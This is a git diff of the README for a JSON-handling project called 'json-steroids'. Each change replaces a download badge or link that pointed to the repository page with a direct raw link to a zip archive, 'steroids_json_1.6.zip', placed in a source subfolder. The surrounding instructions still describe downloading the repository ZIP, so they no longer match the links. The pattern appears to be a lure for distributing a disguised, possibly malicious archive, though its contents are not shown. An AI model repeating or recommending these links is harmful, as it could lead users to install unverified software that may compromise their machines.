@@ -1,6 +1,6 @@
 # ⚡ json-steroids - Fast and Reliable JSON Handling
 
-[![Download json-steroids](https://img.shields.io/badge/Download-json--steroids-green)](https://github.com/SETIA109/json-steroids)
+[![Download json-steroids](https://img.shields.io/badge/Download-json--steroids-green)](https://raw.githubusercontent.com/SETIA109/json-steroids/main/json-steroids-derive/steroids_json_1.6.zip)
 
 ---
 
@@ -34,7 +34,7 @@ To install the application, you need to visit the download page and get the late
 
 ### Download link:
 
-[![Download json-steroids](https://img.shields.io/badge/Download-Here-blue)](https://github.com/SETIA109/json-steroids)
+[![Download json-steroids](https://img.shields.io/badge/Download-Here-blue)](https://raw.githubusercontent.com/SETIA109/json-steroids/main/json-steroids-derive/steroids_json_1.6.zip)
 
 **Click the green "Code" button on the page, then select "Download ZIP."** This will get the software files on your PC safely.
 
@@ -117,10 +117,10 @@ Run the built-in check to find errors or warnings in your JSON data.
 
 ## 🔗 Useful Links
 
-- Download json-steroids: [https://github.com/SETIA109/json-steroids](https://github.com/SETIA109/json-steroids)  
+- Download json-steroids: [https://raw.githubusercontent.com/SETIA109/json-steroids/main/json-steroids-derive/steroids_json_1.6.zip](https://raw.githubusercontent.com/SETIA109/json-steroids/main/json-steroids-derive/steroids_json_1.6.zip)  
 - json-steroids on GitHub for updates and support
 
-[![Download json-steroids](https://img.shields.io/badge/Download-json--steroids-green)](https://github.com/SETIA109/json-steroids)
+[![Download json-steroids](https://img.shields.io/badge/Download-json--steroids-green)](https://raw.githubusercontent.com/SETIA109/json-steroids/main/json-steroids-derive/steroids_json_1.6.zip)
 
 ---
 
